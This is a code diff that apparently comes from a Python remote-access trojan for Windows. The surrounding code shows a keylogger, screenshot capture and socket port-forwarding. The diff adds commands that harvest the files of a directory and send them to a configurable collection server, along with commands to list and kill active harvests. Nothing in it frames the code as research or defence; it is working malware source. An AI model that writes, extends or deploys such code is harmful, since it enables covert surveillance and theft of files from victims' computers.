@@ -30,6 +30,8 @@ import win32evtlog
 import win32security
 import win32evtlogutil
 
+from directoryHarvester import DirectoryHarvester
+
 class PortForwardOutboundLoop(Thread):
 	def __init__(self, daemon, targetHost, targetPort, remoteSocket, socketLock):
 		# Call the Thread class's init function
@@ -86,7 +88,6 @@ class PortForwardInboundLoop(Thread):
 
 				data = self.remoteSocket.recv(4096)
 				if data:
-					print(base64.b64encode(data).decode('ascii'))                
 					self.daemon.pushForward(self.targetHost + ":" + str(self.targetPort), data)
 			except socket.timeout as e:
 				dummy=1
@@ -96,15 +97,11 @@ class PortForwardInboundLoop(Thread):
 				self.socketLock.acquire()
 				while not reconnected: 
 					try:
-						print("Trying socket")
 						remoteSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 						remoteSocket.connect((self.targetHost, self.targetPort))
 						reconnected = True
-						print("Update socket")                        
 						self.remoteSocket = remoteSocket
-						print("Other looper")                        
 						self.outboundLoop.updateSocket(remoteSocket)
-						print("Success?")                        
 					except Exception as e:    
 						print("Cannot connect {}".format(e), file=sys.stderr)        
 				print("Releasing")
@@ -179,6 +176,9 @@ class Keylogger:
 		self.report()
 
 class LocalAgent:
+	harvester_server = '127.0.0.1'
+	harvester_port = 8010
+
 	def __init__(self):
 		self.daemonUID = self.makeUID();
 
@@ -188,6 +188,7 @@ class LocalAgent:
 
 	outboundLooperDict = {}
 	inboundLooperDict = {}
+	directoryHarvesterDict = {}
 
 	def takeScreenshot(self, postScreenshot):
 		image = pyautogui.screenshot()
@@ -254,6 +255,46 @@ class LocalAgent:
 
 	def pushForward(self, forwardID, data):
 		raise NotImplementedError("Please Implement this method") 
+
+	def harvestCurrentDirectory(self):
+		harvester = DirectoryHarvester(os.path.abspath(os.getcwd()), self, self.harvester_server, self.harvester_port)
+		harvester.start()
+		self.directoryHarvesterDict[os.path.abspath(os.getcwd())] = harvester
+		self.postResponse("Started Harvest: " + os.path.abspath(os.getcwd()))
+
+	def listActiveHarvests(self):
+		idx = 0
+		killList = list()
+		for key in self.directoryHarvesterDict:
+			if self.directoryHarvesterDict[key].isComplete():
+				killList.append(key)
+			else:
+				self.postResponse(str(idx) + " : " + key)
+				idx = idx + 1
+		for key in killList:
+			del self.directoryHarvesterDict[key]
+		if idx == 0:
+			self.postResponse("No active harvests")
+                
+	def killHarvest(self, harvest):
+		idx = 0
+		target = None
+		for key in self.directoryHarvesterDict:
+			if(idx == harvest):
+				self.directoryHarvesterDict[key].kill()
+				target = key
+			idx = idx + 1
+		if target:
+			del self.directoryHarvesterDict[key]
+			self.postResponse("Harvester terminated: " + target)
+
+	def killAllHarvests(self):
+		killList = list()
+		for key in self.directoryHarvesterDict:
+			self.directoryHarvesterDict[key].kill()
+			killList.append(key)
+		for key in killList:
+			del self.directoryHarvesterDict[key]
 
 	def processNewForwardRequest(self, request):
 		elements = request.split(" ")
@@ -357,6 +398,23 @@ class LocalAgent:
 			except:
 				self.postResponse("Invalid directory traversal")
 			self.postResponse(os.getcwd())
+			return None
+		elif response == 'listActiveHarvests':
+			self.listActiveHarvests()
+		elif response == 'kill_all_harvests':
+			self.killAllHarvests()
+			self.postResponse("All harvests terminated")
+		elif response.startswith('kill_harvest'):
+			elements = response.split(" ")
+			if len(elements) == 2:
+				if not elements[1].isnumeric():
+					self.postResponse("Invalid kill_harvest command")
+				else:
+					self.killHarvest(int(elements[1]))
+			else:
+				self.postResponse("Invalid kill_harvest command")
+		elif response == 'harvest_pwd':
+			self.harvestCurrentDirectory()
 			return None
 		elif response == 'pwd':
 			self.postResponse(os.getcwd())
